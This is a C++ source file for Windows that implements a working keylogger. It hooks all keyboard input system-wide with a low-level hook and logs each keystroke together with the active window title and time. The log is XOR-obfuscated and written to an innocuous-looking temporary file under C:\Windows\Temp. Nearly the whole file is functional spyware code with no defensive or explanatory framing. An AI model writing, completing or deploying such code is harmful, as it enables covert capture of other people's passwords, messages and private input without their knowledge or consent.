#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
//#define USE_CXX_AES
//#include "AES.h"
std::string key = "ÜãHâÜHãHÉ¿âÓÖHãÜ Hâ∏Ñ«ûÑòÑ«Ñ ∏Hk¿ HçöÑH«˚HçÍHãŒHˇ*Éœ@ÈXÈ∫Ô}@å©˛ˇˇMÖÌÑ…¿uÉ}‰uÉ}u";
/*
unsigned char key[] = {
	  0x60, 0xa1, 0x42, 0x03, 0xf4, 0x05, 0x76, 0x37,
	  0x08, 0x09, 0x0a, 0x0b, 0x7c, 0x6d, 0x3e, 0x3f,
};*/

//Cipher::Aes<128> aes(key);
//std::string File;
std::ofstream output_file;
//FILE* openfile = nullptr;
/*
void FlushFile() {
	//fflush(openfile);
}
void UpdateFile() {
	//fseek(openfile, 0, 0);
	//fwrite(File.c_str(), sizeof(char), File.length(), openfile);
	output_file.seekp(0);
	//output_file.clear();
	output_file << File;
	output_file.flush();
}
void UpdateString() {
	
}
void WriteLine(const std::string& c) {
	File += c;
	UpdateFile();
}
*/

std::string EncryptDecrypt(std::string toEncrypt) {
	
	std::string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++) {
		for (auto& c : key)
			output[i] ^= c;
	}

	return output;
}

void RefPtrEncrypt(std::string* toEncrypt) {
	for (int i = 0; i < toEncrypt->size(); i++) {
		for (auto& c : key)
			(*toEncrypt)[i] ^= c;
	}

}

void pPrint(std::string t, bool nl = true) {
	std::cout << t;
	if (nl) {
		std::cout << "\n";
	}
}

const std::map<int, std::string> keyname{
	{VK_BACK, "[-\\]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	" " },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
//std::ofstream output_file;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0 || wParam != WM_KEYDOWN)
		return CallNextHookEx(_hook, nCode, wParam, lParam);

	kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	Save(kbdStruct.vkCode);

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
/*
unsigned long __stdcall FlushThread(void*) {

	while (true) {
		output_file.flush();
		Sleep(200);
	}

	return 0;
}*/

void SetHook()
{
	/*
	if (HANDLE handle = CreateThread(nullptr, 0, FlushThread, nullptr, 0, nullptr))
	{
		CloseHandle(handle);
	}*/

	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}



int Save(int key_stroke) {
	std::stringstream output;
	static char lastwindow[256] = "";

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground) {
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);

		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0){
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			struct tm tm_info;
			time_t t = time(NULL);
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);
		
			output << ("\n[Window: ") << (window_title) << (" - at ") << (s) << ("] ");
		}
	}


	if (keyname.find(key_stroke) != keyname.end())
		output << (keyname.at(key_stroke));
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}
	
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		if (!lowercase)
		{
			key = tolower(key);
		}
		std::string a;
		a = key;
		output << (a);
	}

	//WriteLine(output.str());
	
	output_file << EncryptDecrypt(output.str());
	output_file.flush();

	pPrint(output.str(), false);
	//std::cout << output.str();

	return 0;
}

bool IsSystemBooting()
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main()
{

	//aes.encrypt_block();
	//std::ofstream output_file;
	const char* output_filename = "C:\\Windows\\Temp\\wct1A3KM23LS19PW.tmp";

//	Sleep(500);
//	std::cout << "Logging output to " << output_filename << std::endl;
	pPrint("Logging output to ", false);
	pPrint(output_filename, false);
	while(!output_file.is_open())
		output_file.open(output_filename, std::ios_base::app);
	/*
	while(!openfile) {
		//char buffer[25];
		//strerror_s(buffer, fopen_s(&openfile, output_filename, "w+"));
		//pPrint(buffer);
		fopen_s(&openfile, output_filename, "w+");
	}*/

	SetHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}
}